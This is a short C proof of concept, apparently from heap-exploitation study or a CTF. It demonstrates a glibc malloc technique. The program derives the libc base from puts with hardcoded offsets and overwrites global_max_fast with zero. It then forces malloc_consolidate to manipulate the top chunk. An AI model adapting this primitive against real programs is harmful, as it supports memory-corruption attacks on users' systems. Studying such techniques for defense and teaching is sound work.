#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>


size_t getlibc()
{
    puts("getlibc");
    size_t libc_addr=puts-0x6d640;
    size_t global_max_fast=libc_addr+0x3ad8f0;
    return global_max_fast;
}

int main()
{
    size_t* fastchunk=malloc(0x10);
    free(fastchunk);  // have_fastchunks 
    size_t* chunk1=malloc(0x500);
    free(chunk1);
    malloc(0x200); // after split is in smallbin range so become last_remainder
    size_t* global_max_fast=getlibc();
    *global_max_fast=0;  //set  global_max_fast 0
    malloc(0x500);    // malloc largebin size strike malloc_consolidate  to make top change

}